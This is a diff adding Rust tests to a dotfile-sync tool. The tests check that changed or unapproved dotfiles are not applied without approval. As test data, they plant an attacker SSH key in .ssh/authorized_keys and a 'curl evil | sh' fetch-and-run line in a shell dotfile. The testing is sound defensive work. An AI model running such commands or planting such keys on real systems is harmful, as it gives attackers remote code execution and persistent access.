@@ -621,3 +621,65 @@ fn sync_adopts_a_dotfiles_symlink_instead_of_failing_and_warns() {
         "the warning names the old link target: {warning}"
     );
 }
+
+// ---------------------------------------------------------------------------
+// 6. Managed dotfiles are executable-adjacent: they need approval too
+// ---------------------------------------------------------------------------
+
+fn declare_dotfile(env: &MusterEnv, target: &str, body: &str) {
+    let cfg = env.config_dir();
+    std::fs::create_dir_all(cfg.join("files")).expect("files dir");
+    std::fs::write(cfg.join("files/payload"), body).expect("payload");
+    let manifest = std::fs::read_to_string(cfg.join("muster.toml")).expect("manifest");
+    let manifest = manifest.split("\n[files.").next().unwrap().to_owned();
+    std::fs::write(
+        cfg.join("muster.toml"),
+        format!("{manifest}\n[files.\"{target}\"]\nsource = \"files/payload\"\n"),
+    )
+    .expect("manifest with dotfile");
+}
+
+#[test]
+fn unapproved_dotfile_is_not_applied_unattended() {
+    let env = MusterEnv::new();
+    init_and_seed(&env, "");
+    all_json(&env, &["sync", "--yes"]);
+    declare_dotfile(&env, ".ssh/authorized_keys", "ssh-ed25519 AAAAattacker\n");
+
+    let (out, _e) = all_json(&env, &["sync"]);
+    assert_eq!(out.status.code(), Some(2), "{}", stdout_of(&out));
+    assert!(!env.path().join(".ssh/authorized_keys").exists());
+
+    let (plan, _p) = all_json(&env, &["plan"]);
+    assert!(
+        stdout_of(&plan).contains("\"dotfile\""),
+        "{}",
+        stdout_of(&plan)
+    );
+}
+
+#[test]
+fn approved_dotfile_applies_and_does_not_reprompt_until_content_changes() {
+    let env = MusterEnv::new();
+    init_and_seed(&env, "");
+    declare_dotfile(&env, ".bashrc-muster", "echo one\n");
+    let (out, _e) = all_json(&env, &["sync", "--yes"]);
+    assert!(out.status.success(), "{}", stdout_of(&out));
+    assert_eq!(
+        std::fs::read_to_string(env.path().join(".bashrc-muster")).unwrap(),
+        "echo one\n"
+    );
+
+    // Unchanged: unattended sync is fine.
+    let (out, _e) = all_json(&env, &["sync"]);
+    assert!(out.status.success(), "{}", stdout_of(&out));
+
+    // Content changed remotely: needs approval again.
+    declare_dotfile(&env, ".bashrc-muster", "curl evil | sh\n");
+    let (out, _e) = all_json(&env, &["sync"]);
+    assert_eq!(out.status.code(), Some(2), "{}", stdout_of(&out));
+    assert_eq!(
+        std::fs::read_to_string(env.path().join(".bashrc-muster")).unwrap(),
+        "echo one\n"
+    );
+}
